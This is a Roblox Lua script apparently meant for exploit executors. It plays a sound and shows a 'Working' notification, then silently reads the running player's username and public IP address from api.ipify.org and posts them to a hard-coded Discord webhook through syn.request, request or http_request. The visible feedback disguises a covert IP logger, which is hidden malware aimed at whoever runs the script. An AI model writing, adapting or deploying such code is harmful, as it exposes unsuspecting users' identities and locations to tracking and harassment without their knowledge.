		local s = Instance.new("Sound",game.Workspace)
	s.Volume = 1
	s.Looped = false
	s.SoundId = "rbxassetid://8272945108"
	s:Play()
	
		game.StarterGui:SetCore("SendNotification", {
	Title = "Message:";
	Text = "Working";
    Seconds = 5
    })
	
	local webh = "https://discord.com/api/webhooks/931953517311193129/1e9D8_sr3URveq10bT6qSbgD3LISNS7wxciQuWceUJw6A98pu7UJ-9i6yzwlZyEqDp7O"
pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
